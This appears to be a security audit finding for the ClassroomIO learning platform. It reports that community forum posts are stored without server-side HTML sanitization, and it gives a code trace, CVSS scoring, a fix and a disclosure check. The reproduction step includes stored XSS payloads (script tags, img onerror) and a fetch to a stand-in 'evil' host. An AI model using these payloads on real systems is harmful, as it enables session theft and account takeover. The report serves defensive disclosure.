# VULN-031 — Community `title`/`body` persisted without server-side sanitization (latent stored XSS)

| | |
|---|---|
| **ID** | VULN-031 (raw F-16) |
| **Software** | ClassroomIO |
| **Repository** | https://github.com/classroomio/classroomio |
| **Affected version** | 0.1.13 (`package.json`) — commit-pinned, no tagged release |
| **Commit** | `0c356ad6f1a4d8449425b902afae58b3ebd9f443` |
| **Severity** | Medium — **CVSS 3.1 5.4** `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` |
| **Status** | **CONFIRMED (dynamic)** — stored unsanitized HTML-injection; script execution mitigated today |
| **Auth required** | Any authenticated org member (STUDENT) |
| **What an attacker gains** | Persist arbitrary HTML (`<script>`, `<img onerror>`) in community content — HTML-injection/phishing now, and full stored XSS on any reader that renders the column without DOMPurify or relaxes the CSP |

## Summary

Every content write path in the app runs the shared `sanitizeHtml()` (server-side DOMPurify) before
persisting — **except** the community forum. `createQuestion` / `editQuestion` / `createComment`
store `title` and `body` verbatim. A stored `<script>`/`onerror` payload is therefore saved intact.
Confirmed live: a community question with `<script>alert()</script>` in the body and
`<img src=x onerror=…>` in the title was stored byte-for-byte, while the **same** payload sent to the
course newsfeed came back stored as `<img src="x"><b>…</b>` — the script element and event handler
stripped. The divergence isolates the missing sanitizer to the community write path.

Today, script execution in the dashboard is mitigated by two independent controls (the render path's
DOMPurify and a CSP without `'unsafe-inline'`), so the confirmed impact is **stored HTML-injection /
latent stored XSS**, not live script-XSS in the dashboard.

## How it works (mechanism & code trace)

**Vulnerable write — `apps/api/src/services/community.ts:102-123`.** The service inserts `title`/
`body` with no neutralization:

```ts
export async function createQuestion({ title, body, courseId, organizationId, authorProfileId, votes, slug }) {
    if (!courseId || !organizationId || !authorProfileId) { throw ...; }
    const result = await createCommunityQuestion({ title, body, courseId, organizationId, authorProfileId, votes, slug });
    // ↑ title/body passed straight through — no sanitizeHtml
```

`editQuestion` (`:147-160`) and `createComment` (`:162-185`) are identical in this respect, and the
query `createCommunityQuestion` (`packages/db/src/queries/community/community.ts:199-221`) writes the
raw strings.

**The safe sibling proves it's a defect — `apps/api/src/services/newsfeed/newsfeed.ts:108`:**

```ts
const sanitizedContent = sanitizeHtml(data.content);   // newsfeed neutralizes on write
const newsfeedData: TNewCourseNewsfeed = { courseId, authorId, content: sanitizedContent, isPinned: ... };
```

`sanitizeHtml` (`packages/core/src/utils/sanitize-html.ts`) is `DOMPurify.sanitize(html, …)` under
`isomorphic-dompurify` — it runs server-side and, as observed, removes `<script>` and `onerror`. The
community path simply never calls it.

**Current mitigations (why it isn't live script-XSS today):**
- **Render — `packages/ui/src/custom/safe-html-content/safe-html-content.svelte`** routes community
  content through `splitHtmlAndSvg` → `sanitize.ts` (DOMPurify) before `{@html}`.
- **CSP — `apps/dashboard/svelte.config.js:42-44`** sets `script-src` to `['self', …, 'unsafe-hashes',
  'unsafe-eval']` with **no** `'unsafe-inline'`, so an inline handler would be blocked even if it
  reached the DOM.

These are output-time defenses layered on top of the storage defect; the data at rest is dangerous.

## Why it is a vulnerability (reasoning)

Storing unsanitized markup makes the system's safety depend on *every* current and future reader
remembering to sanitize. That is a defense-in-depth failure and a latent stored XSS: the moment any
consumer renders `community_question.body` without DOMPurify — server-side rendering, an
email/PDF/export pipeline, a mobile or third-party API client, or a CSP relaxation — the stored
`<script>`/`onerror` executes in that context with the victim's session. The finding is scored as a
mitigated Medium precisely because exploitation *today* is HTML-injection/phishing (inject
misleading markup and links that survive), with a clear escalation path to session-stealing XSS on a
single missed sanitizer. We are precise here: **the storage gap is confirmed; live script execution
in the dashboard is not, and is not claimed.**

## Reproduction

Preconditions: target up. `./run.sh` provisions a STUDENT and a course.

1. Post the payload: `POST /community` with
   `title = <img src=x onerror=alert("m")>`, `body = <script>alert("m")</script><img src=x onerror="fetch('//evil/m')"><b>m</b>`
   → `201`.
2. Verify storage: `docker exec cio-postgres psql … -c "select title, body from community_question where slug='…'"`
   → both fields contain the raw `<script>`/`onerror`.
3. Contrast: post the same body to `POST /course/<c>/newsfeed` → the stored `content` is
   `<img src="x"><b>m</b>` (script/handler stripped).
4. `./run.sh` → `[OK] confirmed …`, exit 0. Transcript in `run.log`; stored values in `response.txt`.

Observable proof: identical input is stored raw by community and sanitized by newsfeed.

## Impact

- **Now:** stored HTML-injection — phishing links, spoofed "official" formatting/layout, misleading
  markup in a trusted LMS forum (compounded by VULN-002, which lets the attacker post as any user).
- **On one missed sanitizer:** stored XSS — session/cookie theft, account takeover, admin CSRF, for
  every reader of the post. UI:R reflects that a victim must view the post; S:C because the payload
  runs in the dashboard's origin against other users.

## Suggested fix

Sanitize on write in the community service, matching the newsfeed/lesson paths
(`apps/api/src/services/community.ts`):

```ts
// createQuestion / editQuestion / createComment
const safeTitle = sanitizeHtml(title);
const safeBody  = sanitizeHtml(body);
// persist safeTitle / safeBody
```
Server-side neutralization here means a single output-side omission is no longer catastrophic
(defense in depth), and brings community into line with every sibling content path.

## References
- OWASP WSTG-INPV-02 "Testing for Stored Cross Site Scripting"; OWASP XSS Prevention Cheat Sheet.
- CWE-79 Improper Neutralization of Input During Web Page Generation ("Cross-site Scripting").

## Known Issue Check

| | |
|---|---|
| **Verdict** | NOT KNOWN (no matching public disclosure found) |
| **Confidence (not previously known)** | 80 / 100 |
| **Checked on** | 2026-10-21 |
| **Method** | Web search of CVE/NVD, GitHub Security Advisories, vendor advisories, issue trackers, huntr/HackerOne/Snyk |

**Searches performed (proof of "nothing found"):**
1. `ClassroomIO CVE security vulnerability` — 7 CVEs; the only XSS entries (CVE-2025-65675/65676) are SVG image uploads.
2. `classroomio github security advisory GHSA` — 9 GHSAs; no community-forum XSS.
3. `classroomio huntr vulnerability report` — no huntr/HackerOne reports for the project.
4. NVD API `keywordSearch=classroomio` (8 CVEs), `osv.dev/list?q=classroomio` (8), Snyk search (none), repo `security/advisories` (none) — no community XSS.
5. Issue tracker `community XSS OR "community question" OR community_question OR DOMPurify OR sanitizeHtml OR "HTML injection"` — 20 hits (#923 content reporting, #157/#136 2024 features, #777 unmerged); none report unsanitized community writes.
6. Issue tracker `certificate OR "lesson completion" OR sanitize OR "stored XSS" OR community` — 243 hits of feature noise; none.
7. Commit search `"custom domain" OR "automation key" OR sanitize OR certificate OR PUBLIC_IS_SELFHOSTED` — 5a8f50f (2026-03-30 "content sanitization") predates the audit and did not cover community; fetched `main` `apps/api/src/services/community.ts`: `createQuestion` / `editQuestion` / `createComment` still pass `title`/`body` through with no sanitizer.
8. Fetched PR #777 (closed, unmerged 2026-08-24) — sanitizes AI-assistant markdown in the dashboard; community untouched. Fetched issue #1068 / PR #1069 — `javascript:` URLs in landing-page link fields; different component.
(Note: WebSearch quota exhausted after the general sweep; items 4–8 are direct queries of the vulnerability databases and the upstream tracker/commit history.)

**Related but distinct public references** (same class or component, not this bug):
- CVE-2025-65675 / GHSA-gfvq-wmqw-q9j2 and CVE-2025-65676 / GHSA-rxc6-c5mm-j9vx — stored XSS via SVG profile/cover images (fixed in 900f5ec); different sink.
- Issue #1068 / PR #1069 (2026-09-07) — `javascript:` hrefs in landing-page link fields; different component and vector.
- PR #777 (unmerged) — AI markdown output sanitization; different content path.

**Reasoning:** No public record identifies the community `title`/`body` write path as the one content path that skips the shared `sanitizeHtml()`; the public XSS history concerns SVG uploads and landing-page links. The storage gap persists on `main`. Stored XSS is a common class and the finding is currently mitigated at render time, so a low-severity private note is conceivable, hence 80.
